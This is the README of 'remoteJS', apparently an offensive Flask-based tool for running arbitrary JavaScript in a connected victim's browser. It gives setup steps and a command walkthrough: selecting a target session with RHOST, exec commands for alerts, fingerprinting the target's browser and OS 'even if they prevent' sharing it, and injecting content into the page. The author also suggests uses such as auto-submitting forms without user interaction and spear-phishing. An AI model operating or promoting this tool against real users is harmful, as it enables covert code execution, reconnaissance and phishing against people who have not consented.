# remoteJS

## Spawn a remote shell in a client's browser.
This tool has the potential to be used for malicious use, such as inserting form controls, using autocomplete to fill them, and then submitting them, all without any user interaction. 

Furthermore spear phising attacks can be carried out by sending specific content to different people dynamically, including alerts and popups.

Please use responsibly, as I am not liable for any damage (including criminal charges) which may arise from use of this software.

## Requirements
To use remoteJS, you will need Python 3.
Additionally, you will need to install some dependencies:

```pip3 install -r requirements.txt```

## Usage
To startup the server and interpreter, enter the following:

```python3 remoteJS.py```

You should then see the following interpreter:
```
~/Projects/remoteJS >>> python3 wwwserver.py

        ____                       __           _______
       / __ \___  ____ ___  ____  / /____      / / ___/
      / /_/ / _ \/ __ `__ \/ __ \/ __/ _ \__  / /\__ \ 
     / _, _/  __/ / / / / / /_/ / /_/  __/ /_/ /___/ / 
    /_/ |_|\___/_/ /_/ /_/\____/\__/\___/\____//____/  
                                            By fputs    
    
 * Serving Flask app "remoteJS" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Ready!

(None)>
```

### Available Commands
You can view all available commands by running the `help` command:

```
(None)>help

Command       | Description                          | Syntax
--------------------------------------------------------------------------------
set           | Sets an environment variable.        | set <varname> <value>
show          | Shows an environment variable.       | show (varname|all)
show sessions | Shows all active sessions.           | show sessions
exit          | Shuts down the server.               | exit|quit
exec          | Run a script in the client's browser | exec <script>
```

### Viewing Connected Hosts
In order to execute a script in a client's browser, you must first select the client from the current sessions. To view sessions, run the `show sessions` command:

```
(None)>show sessions

Hostname             | TTL (sec)                 
--------------------------------------------------------------------------------
localhost            | 2                                                           
```

In this example, we can see that we have an active session open to `localhost`.

### Selecting a Host
Now we must select our host, so we set variables using the `set` command. Naming conventions follow Metasploit's names, so we must set the `RHOST` variable to define our target:

```
(None)>set RHOST localhost
Assigned RHOST -> localhost
(localhost)>
```

You can now see, that the target host appears within the cursor, to indicate that we will execute our scripts within that host's browser.

### Launching a Script
Currently remoteJS only supports manual typing of scripts via the commandline, however I will be adding modules to allow different scripts to be automatically loaded.

Let's send our target a friendly alert that will say 'Hello localhost!'. To do this, we will use the `exec` command, this allows us to run any Javascript we like:

```
(localhost)>exec alert('Hello localhost!')
localhost:5000: Status=OK
```

This method will also provide a status and response.

## More Examples

### Getting Information
We can also use this tool to carry out some recon on our target, for instance, we can get information about their CPU, browser and OS, even if they prevent the browser from sharing this information in GET/POST requests. This is done by executing a simple script:

```
(localhost)>exec navigator.userAgent
localhost:5000: Status=OK, Response=Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0f
```

Magic! We now know that the user is on a 64-bit Intel Linux box, running Firefox version 77.

### Modifying DOM
If you know anything about manipulating DOM with JS, then this will be no surprise, but we can dynamically modify the webpage on the fly. In this example, we insert a new subheading:

```
(localhost)>exec {document.getElementsByTagName("body")[0].innerHTML += "<h2>Where did that come from?</h2>"; true;}
localhost:5000: Status=OK, Response=true
```

This adds a subheading containing the text `Where did that come from?`.

You may notice I've enclosed the statement in curly braces, with a `true` statement inserted at the end. This supresses the output of the command, as remoteJS uses the javascript `eval` command, and in this instance, it would return the entire document DOM, and that just doesn't look nice.

